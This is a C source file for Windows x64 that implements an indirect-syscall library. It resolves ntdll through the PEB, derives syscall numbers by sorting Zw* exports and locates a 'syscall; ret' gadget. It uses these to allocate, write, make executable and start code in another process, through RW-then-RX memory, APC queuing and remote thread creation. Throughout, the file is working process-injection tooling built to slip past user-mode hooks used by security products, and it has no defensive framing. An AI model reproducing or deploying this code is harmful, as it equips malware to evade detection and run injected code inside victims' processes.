/*
 * ntsys implementation - see ntsys.h. x64 only; other architectures get an
 * empty translation unit so shared build scripts stay simple.
 */

#ifdef _WIN64

#include "ntsys.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  unsigned short Length;
  unsigned short MaximumLength;
  wchar_t *Buffer;
} ntsys_unicode_string;

uintptr_t ntsys_module_base(const wchar_t *module) {
  uintptr_t peb = __readgsqword(0x60);
  uintptr_t ldr = *(uintptr_t *)(peb + 0x18);
  uintptr_t head = ldr + 0x20; /* InMemoryOrderModuleList */
  uintptr_t cur = *(uintptr_t *)head;

  while (cur != 0 && cur != head) {
    uintptr_t dllbase = *(uintptr_t *)(cur + 0x20);
    ntsys_unicode_string *name = (ntsys_unicode_string *)(cur + 0x48);
    if (dllbase != 0 && name->Buffer != NULL) {
      unsigned int len = name->Length / sizeof(wchar_t);
      unsigned int want = 0;
      unsigned int i;
      while (module[want] != L'\0') {
        want++;
      }
      if (len == want) {
        for (i = 0; i < len; i++) {
          wchar_t c = name->Buffer[i];
          if (c >= L'A' && c <= L'Z') {
            c += 32;
          }
          if (c != module[i]) {
            break;
          }
        }
        if (i == len) {
          return dllbase;
        }
      }
    }
    cur = *(uintptr_t *)cur;
  }
  return 0;
}

uintptr_t ntsys_export(uintptr_t base, const char *name) {
  IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
  IMAGE_NT_HEADERS *nt;
  IMAGE_EXPORT_DIRECTORY *dir;
  uint32_t *names, *funcs;
  uint16_t *ords;
  uint32_t i;

  if (base == 0 || dos->e_magic != IMAGE_DOS_SIGNATURE) {
    return 0;
  }
  nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
    return 0;
  }
  dir = (IMAGE_EXPORT_DIRECTORY *)(base +
      nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress);
  if (dir->NumberOfNames == 0) {
    return 0;
  }
  names = (uint32_t *)(base + dir->AddressOfNames);
  funcs = (uint32_t *)(base + dir->AddressOfFunctions);
  ords = (uint16_t *)(base + dir->AddressOfNameOrdinals);
  for (i = 0; i < dir->NumberOfNames; i++) {
    char *cname = (char *)(base + names[i]);
    if (strcmp(cname, name) == 0) {
      return base + funcs[ords[i]];
    }
  }
  return 0;
}

/*
 * SSN cache: the first resolution walks the whole export table and ranks
 * every Zw* export by address (their index equals the SSN - Nt* and Zw*
 * stubs share one syscall table); results are cached per name.
 */
static struct {
  char name[64];
  unsigned int ssn;
} ntsys_ssn_cache[16];
static int ntsys_ssn_cache_n = 0;
static uintptr_t ntsys_zw_addrs[512];
static int ntsys_zw_n = -1; /* -1 = Zw table not collected yet */

unsigned int ntsys_ssn(const char *nt_name) {
  int i;

  for (i = 0; i < ntsys_ssn_cache_n; i++) {
    if (strcmp(ntsys_ssn_cache[i].name, nt_name) == 0) {
      return ntsys_ssn_cache[i].ssn;
    }
  }

  if (ntsys_zw_n < 0) {
    uintptr_t ntdll = ntsys_module_base(L"ntdll.dll");
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    IMAGE_EXPORT_DIRECTORY *dir;
    uint32_t *names, *funcs;
    uint16_t *ords;
    uint32_t k;
    int j;
    if (ntdll == 0) {
      return NTSYS_SSN_INVALID;
    }
    dos = (IMAGE_DOS_HEADER *)ntdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
      return NTSYS_SSN_INVALID;
    }
    nt = (IMAGE_NT_HEADERS *)(ntdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
      return NTSYS_SSN_INVALID;
    }
    dir = (IMAGE_EXPORT_DIRECTORY *)(ntdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
            .VirtualAddress);
    names = (uint32_t *)(ntdll + dir->AddressOfNames);
    funcs = (uint32_t *)(ntdll + dir->AddressOfFunctions);
    ords = (uint16_t *)(ntdll + dir->AddressOfNameOrdinals);
    ntsys_zw_n = 0;
    for (k = 0; k < dir->NumberOfNames; k++) {
      char *cname = (char *)(ntdll + names[k]);
      if (cname[0] == 'Z' && cname[1] == 'w' && cname[2] != '\0') {
        /* guard the Zw table during collection instead of trusting
         * NumberOfNames, which counts every export, not just Zw* */
        if ((size_t)ntsys_zw_n >=
            sizeof(ntsys_zw_addrs) / sizeof(ntsys_zw_addrs[0])) {
          return NTSYS_SSN_INVALID;
        }
        ntsys_zw_addrs[ntsys_zw_n++] = ntdll + funcs[ords[k]];
      }
    }
    /* insertion sort ascending */
    for (k = 1; k < (uint32_t)ntsys_zw_n; k++) {
      uintptr_t key = ntsys_zw_addrs[k];
      for (j = (int)k - 1; j >= 0 && ntsys_zw_addrs[j] > key; j--) {
        ntsys_zw_addrs[j + 1] = ntsys_zw_addrs[j];
      }
      ntsys_zw_addrs[j + 1] = key;
    }
  }

  {
    /* twin name: leading pair Nt -> Zw */
    char twin[64];
    uintptr_t twin_addr;
    unsigned int ssn = NTSYS_SSN_INVALID;
    if (strlen(nt_name) + 1 > sizeof(twin) ||
        strncmp(nt_name, "Nt", 2) != 0) {
      return NTSYS_SSN_INVALID;
    }
    twin[0] = 'Z';
    twin[1] = 'w';
    strcpy(twin + 2, nt_name + 2);
    twin_addr = ntsys_export(ntsys_module_base(L"ntdll.dll"), twin);
    if (twin_addr != 0) {
      for (i = 0; i < ntsys_zw_n; i++) {
        if (ntsys_zw_addrs[i] == twin_addr) {
          ssn = (unsigned int)i;
          break;
        }
      }
    }
    if (ntsys_ssn_cache_n < (int)(sizeof(ntsys_ssn_cache) /
                                  sizeof(ntsys_ssn_cache[0]))) {
      strcpy(ntsys_ssn_cache[ntsys_ssn_cache_n].name, nt_name);
      ntsys_ssn_cache[ntsys_ssn_cache_n].ssn = ssn;
      ntsys_ssn_cache_n++;
    }
    return ssn;
  }
}

uintptr_t ntsys_gadget(void) {
  static uintptr_t gadget = 0;
  static int searched = 0;
  IMAGE_DOS_HEADER *dos;
  IMAGE_NT_HEADERS *nt;
  IMAGE_SECTION_HEADER *sec;
  uint32_t i;
  unsigned char *p;
  size_t k, size;
  uintptr_t ntdll;

  if (searched) {
    return gadget;
  }
  searched = 1;
  ntdll = ntsys_module_base(L"ntdll.dll");
  if (ntdll == 0) {
    return 0;
  }
  dos = (IMAGE_DOS_HEADER *)ntdll;
  nt = (IMAGE_NT_HEADERS *)(ntdll + dos->e_lfanew);
  sec = IMAGE_FIRST_SECTION(nt);
  for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
        sec[i].SizeOfRawData > 3) {
      p = (unsigned char *)(ntdll + sec[i].VirtualAddress);
      size = sec[i].SizeOfRawData;
      for (k = 0; k + 2 < size; k++) {
        if (p[k] == 0x0F && p[k + 1] == 0x05 && p[k + 2] == 0xC3) {
          gadget = (uintptr_t)(p + k);
          return gadget;
        }
      }
    }
  }
  return 0;
}

int ntsys_ready(void) { return ntsys_gadget() != 0; }

long ntsys_invoke(unsigned int ssn, uintptr_t gadget,
                  const unsigned long long *args /* [11] */) {
  long ret;
  /* Frame math: the prologue pushes rdi/rsi/rbx (24 bytes), then we reserve
   * 0x58 = 24 (saved regs) + 8 (ret addr handled by call) ... the 7 stack
   * slots live at 0x20..0x50 and must stay strictly below the pushed regs;
   * 0x48 here silently corrupts saved rbx/rsi and crashes the caller. */
  __asm__ volatile("subq $0x58, %%rsp\n\t"
                   "movq 32(%3), %%rax\n\t"
                   "movq %%rax, 0x20(%%rsp)\n\t"
                   "movq 40(%3), %%rax\n\t"
                   "movq %%rax, 0x28(%%rsp)\n\t"
                   "movq 48(%3), %%rax\n\t"
                   "movq %%rax, 0x30(%%rsp)\n\t"
                   "movq 56(%3), %%rax\n\t"
                   "movq %%rax, 0x38(%%rsp)\n\t"
                   "movq 64(%3), %%rax\n\t"
                   "movq %%rax, 0x40(%%rsp)\n\t"
                   "movq 72(%3), %%rax\n\t"
                   "movq %%rax, 0x48(%%rsp)\n\t"
                   "movq 80(%3), %%rax\n\t"
                   "movq %%rax, 0x50(%%rsp)\n\t"
                   "movq 0(%3), %%r10\n\t"
                   "movq 8(%3), %%rdx\n\t"
                   "movq 16(%3), %%r8\n\t"
                   "movq 24(%3), %%r9\n\t"
                   "movl %k2, %%eax\n\t"
                   "movq %1, %%r11\n\t"
                   "call *%%r11\n\t"
                   "addq $0x58, %%rsp\n\t"
                   : "=&a"(ret)
                   : "r"(gadget), "r"((unsigned long long)ssn), "r"(args)
                   : "r10", "r11", "rdx", "r8", "r9", "rcx", "memory", "cc");
  return ret;
}

BOOL ntsys_alloc_rw(HANDLE proc, void **base, SIZE_T *size) {
  unsigned long long args[11] = {0};
  void *baddr = *base;
  SIZE_T rsize = *size;
  long st;

  args[0] = (unsigned long long)proc;
  args[1] = (unsigned long long)&baddr; /* in/out: base address */
  args[3] = (unsigned long long)&rsize; /* in/out: region size */
  args[4] = MEM_COMMIT | MEM_RESERVE;
  args[5] = PAGE_READWRITE;
  st = ntsys_invoke(ntsys_ssn("NtAllocateVirtualMemory"), ntsys_gadget(), args);
  if (st < 0) {
    return FALSE;
  }
  *base = baddr; /* NT rounds the base down to a page boundary */
  *size = rsize;
  return TRUE;
}

BOOL ntsys_write_mem(HANDLE proc, void *base, const void *buf, SIZE_T len) {
  unsigned long long args[11] = {0};
  SIZE_T written = 0;

  args[0] = (unsigned long long)proc;
  args[1] = (unsigned long long)base;
  args[2] = (unsigned long long)buf;
  args[3] = (unsigned long long)len;
  args[4] = (unsigned long long)&written;
  return ntsys_invoke(ntsys_ssn("NtWriteVirtualMemory"), ntsys_gadget(),
                      args) >= 0;
}

BOOL ntsys_protect_rx(HANDLE proc, void **base, SIZE_T *size) {
  unsigned long long args[11] = {0};
  DWORD old = 0;
  void *baddr = *base;
  SIZE_T rsize = *size;
  long st;

  args[0] = (unsigned long long)proc;
  args[1] = (unsigned long long)&baddr;
  args[2] = (unsigned long long)&rsize;
  args[3] = PAGE_EXECUTE_READ;
  args[4] = (unsigned long long)&old;
  st = ntsys_invoke(ntsys_ssn("NtProtectVirtualMemory"), ntsys_gadget(), args);
  if (st < 0) {
    return FALSE;
  }
  *base = baddr; /* NT rounds the base down to a page boundary */
  *size = rsize;
  return TRUE;
}

BOOL ntsys_queue_apc(HANDLE thread, void *routine) {
  unsigned long long args[11] = {0};

  args[0] = (unsigned long long)thread;
  args[1] = (unsigned long long)routine; /* normal routine: void (*)(ULONG_PTR) */
  return ntsys_invoke(ntsys_ssn("NtQueueApcThread"), ntsys_gadget(), args) >= 0;
}

BOOL ntsys_create_remote_thread(HANDLE proc, void *routine, HANDLE *out) {
  unsigned long long args[11] = {0};
  HANDLE h = NULL;
  long st;

  args[0] = (unsigned long long)&h;
  args[1] = 0x1FFFFF; /* THREAD_ALL_ACCESS */
  args[3] = (unsigned long long)proc;
  args[4] = (unsigned long long)routine;
  args[6] = 0; /* run immediately, not suspended */
  st = ntsys_invoke(ntsys_ssn("NtCreateThreadEx"), ntsys_gadget(), args);
  if (st < 0 || h == NULL) {
    return FALSE;
  }
  *out = h;
  return TRUE;
}

#else /* !_WIN64: keep the translation unit non-empty */

typedef int ntsys_placeholder_t;

#endif /* _WIN64 */
